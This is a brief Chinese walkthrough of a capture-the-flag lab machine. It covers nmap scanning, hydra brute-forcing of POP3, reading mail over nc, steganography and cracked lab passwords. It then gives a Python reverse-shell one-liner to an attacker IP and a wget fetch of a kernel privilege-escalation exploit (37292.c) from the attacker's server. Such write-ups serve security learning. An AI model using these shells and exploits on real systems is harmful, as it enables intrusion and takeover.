发现主机

nmap -sP x.x.x.0/24

-A完全扫描，对操作系统和软件版本号进行检测

查看主机开放端口

访问80端口发现存在目录/sev-home/

访问需要密码

我们查看源代码和js文件

js文件中有以下注释内容，加密密码是html加密，我们进行解密，这里还有两个人名，有可能是用户名Boris，Natalya大小写都要尝试

发现开放了我们没有扫描出来的端口pop3

nmap开启全端口扫描

nmap扫描unknown开启的服务

用hydra爆破pop3

用户名boris，natalya

发现两个账户

boris secret1!

natalya bird

用nc登录pop3

nc 192.168.26.133 55007

登录邮件系统后

list 查看邮件列表

retr 数字 查看邮件信息

boris收到的信息说可以破解他的密码

我们登录natalya查看

绑定host然后访问网站，用邮箱里面的账号密码登录

然后我们又发现了一个用户

doak goat

发现文件

下载到一张图片后利用图片隐写术获取更多信息

binwalk（路由逆向分析工具）
exiftool（图虫）
strings（识别动态库版本指令）

发现一段base64加密

然后我们用admin用户去登录xWinter1995x!

使用exp去进行攻击

exploit

python -c ‘import pty; pty.spawn(“/bin/bash”)’

利用服务里面的命令执行反弹shell

nc -lvnp 6666

python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.26.132”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

成功反弹shell

内核提权

uname -a查看内核版本

去寻找对应exp

这个文件用gcc编译的

我们发现靶机没有gcc，有cc，修改成cc即可

searchsploit 编号 查看exp

searchsploit -x 查看路径

把gcc改为cc

vi 37292.c

我们机器开启http服务让靶机下载这里的exp

python -m http.server 8081

wget http://192.168.26.132:8081/37292.c

拿到flag
